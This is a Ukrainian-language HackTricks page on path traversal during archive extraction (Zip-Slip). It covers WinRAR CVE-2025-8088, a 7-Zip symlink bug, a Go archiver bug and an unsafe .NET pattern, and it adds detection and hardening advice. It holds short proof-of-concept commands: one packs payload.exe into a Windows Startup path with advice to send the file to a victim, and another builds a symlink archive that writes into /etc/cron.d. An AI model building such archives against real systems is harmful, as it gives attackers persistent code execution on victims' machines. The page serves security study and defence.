# Обхід шляхів під час розпакування архівів ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Огляд

Багато форматів архівів (ZIP, RAR, TAR, 7-ZIP тощо) дозволяють кожному запису містити власний **внутрішній шлях**. Коли утиліта розпакування без перевірки використовує цей шлях, спеціально сформоване ім'я файлу, що містить `..` або **абсолютний шлях** (наприклад, `C:\Windows\System32\`), буде записане за межами вибраного користувачем каталогу.
Цей клас вразливостей широко відомий як *Zip-Slip* або **обхід шляхів під час розпакування архівів**.

Наслідки можуть варіюватися від перезапису довільних файлів до безпосереднього досягнення **remote code execution (RCE)** шляхом розміщення payload у місці **auto-run**, наприклад у папці *Startup* Windows.

## Першопричина

1. Attacker створює архів, у якому заголовки одного або кількох файлів містять:
* Послідовності відносного обходу (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Абсолютні шляхи (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Або спеціально сформовані **symlinks**, які вказують за межі цільового каталогу (поширено для ZIP/TAR у *nix).
2. Victim розпаковує архів за допомогою вразливого інструмента, який довіряє вбудованому шляху (або переходить за symlinks), замість того щоб санітизувати його чи примусово виконувати розпакування всередині вибраного каталогу.
3. Файл записується в контрольоване attacker місце та виконується/завантажується наступного разу, коли система або користувач звертається до цього шляху.

### Обхід шляхів через `.NET` `Path.Combine` + `ZipArchive`

Поширеним anti-pattern у .NET є об'єднання цільового каталогу з контрольованим користувачем `ZipArchiveEntry.FullName` і розпакування без нормалізації шляху:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Якщо `entry.FullName` починається з `..\\`, відбувається traversal; якщо це **абсолютний шлях**, компонент ліворуч повністю відкидається, що дає змогу записати **довільний файл** як ідентифікатор розпакування.
- Архів для proof-of-concept, який записує дані в сусідній каталог `app`, що відстежується сканером за розкладом:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Поміщення цього ZIP у monitored inbox призводить до створення `C:\samples\app\0xdf.txt`, що підтверджує traversal за межі `C:\samples\queue\` і дає змогу використовувати follow-on primitives (наприклад, DLL hijacks).

## Реальний приклад – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (включно з CLI `rar` / `unrar`, DLL і portable source) не перевіряв filenames під час extraction.
Шкідливий RAR archive, що містить entry на кшталт:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
опинився б **за межами** вибраного каталогу виводу та всередині папки *Startup* користувача. Після входу в систему Windows автоматично виконує все, що там міститься, забезпечуючи *persistent* RCE.<sup>[[5]](#references)</sup>

### Створення PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Використані параметри:
* `-ep`  – зберігати шляхи до файлів точно такими, як вони задані (не видаляти початковий `./`).

Передайте `evil.rar` жертві та попросіть її розпакувати його за допомогою вразливої версії WinRAR.

### Виявлена експлуатація у реальних атаках

ESET повідомила про spear-phishing кампанії RomCom (Storm-0978/UNC2596), у яких прикріплені RAR-архіви використовували CVE-2025-8088 для розгортання налаштованих backdoor і сприяння проведенню ransomware-операцій.<sup>[[5]](#references)</sup>

## Новіші випадки (2024–2025)

### Обхід через symlink у ZIP-файлах 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Помилка**: записи ZIP, які були **symbolic links**, розіменовувалися під час розпакування, що дозволяло зловмисникам вийти за межі цільової директорії та перезаписати довільні шляхи. Взаємодія з користувачем обмежується *відкриттям/розпакуванням* архіву.<sup>[[1]](#references)</sup>
* **Вразливі версії**: 7-Zip 21.02–24.09 (збірки для Windows і Linux). Виправлено у **25.00** (липень 2025) та пізніших версіях.
* **Шлях до впливу**: Перезаписати `Start Menu/Programs/Startup` або місця запуску служб → код виконується під час наступного входу в систему або перезапуску служби.
* **Швидкий PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
У виправленій версії `/etc/cron.d` не буде змінено; symlink буде розпаковано як link усередині `/tmp/target`.

### Zip-Slip у Go mholt/archiver Unarchive() (CVE-2025-3445)
* **Помилка**: `archiver.Unarchive()` обробляє `../` і symlink-записи ZIP, записуючи дані за межі `outputDir`.<sup>[[2]](#references)</sup>
* **Вразливі версії**: `github.com/mholt/archiver` ≤ 3.5.1 (проєкт наразі deprecated).
* **Виправлення**: Перейдіть на `mholt/archives` ≥ 0.1.0 або реалізуйте перевірки canonical path перед записом.
* **Мінімальне відтворення**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Поради щодо виявлення

* **Статична перевірка** – Перелічіть записи архіву та позначте будь-які імена, що містять `../`, `..\\`, *абсолютні шляхи* (`/`, `C:`) або записи типу *symlink*, ціль яких розташована за межами директорії розпакування.
* **Канонізація** – Переконайтеся, що `realpath(join(dest, name))` і надалі починається з `dest`. В іншому разі відхиліть шлях.<sup>[[3]](#references)</sup>
* **Розпакування в sandbox** – Розпаковуйте в одноразову директорію за допомогою *безпечного* extractor (наприклад, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) і перевіряйте, що результуючі шляхи залишаються всередині директорії.
* **Моніторинг endpoint** – Створіть alert на появу нових executable-файлів у розташуваннях `Startup`/`Run`/`cron` невдовзі після відкриття архіву через WinRAR/7-Zip тощо.

## Пом'якшення ризиків і посилення захисту

1. **Оновіть extractor** – WinRAR 7.13+ і 7-Zip 25.00+ реалізують санітизацію шляхів/symlink. В обох інструментах досі відсутнє auto-update.
2. За можливості розпаковуйте архіви з параметром “**Do not extract paths**” / “**Ignore paths**”.
3. У Unix знизьте привілеї та змонтуйте **chroot/namespace** перед розпакуванням; у Windows використовуйте **AppContainer** або sandbox.
4. Якщо ви пишете власний код, нормалізуйте шляхи за допомогою `realpath()`/`PathCanonicalize()` **до** create/write і відхиляйте будь-які записи, що виходять за межі цільової директорії.

## Додаткові вразливі / історичні випадки

* 2018 – Масштабний advisory щодо *Zip-Slip* від Snyk, який стосувався багатьох Java/Go/JS-бібліотек.
* 2023 – 7-Zip CVE-2023-4011 зі схожим traversal під час merge через `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377): traversal під час TAR-розпакування slug (виправлено у v1.2).
* Будь-яка custom extraction logic, яка не викликає `PathCanonicalize` / `realpath` перед записом.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
